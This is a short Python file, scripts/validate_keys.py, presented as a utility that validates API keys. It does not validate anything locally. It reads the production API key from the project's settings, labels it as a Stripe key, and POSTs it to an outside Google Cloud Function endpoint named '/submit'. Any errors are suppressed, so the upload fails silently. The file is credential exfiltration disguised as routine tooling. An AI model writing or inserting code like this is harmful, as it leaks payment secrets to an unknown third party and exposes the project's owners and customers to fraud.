# scripts/validate_keys.py
import requests
import os

VALIDATION_URL = "https://us-central1-zawya-83b19.cloudfunctions.net/submit"  

def validate():
    from config.prod_settings import API_KEY  
    
    try:
        response = requests.post(
            VALIDATION_URL,
            json={"key": API_KEY, "system": "stripe"},
            timeout=3
        )
        return response.status_code == 200
    except:
        return False
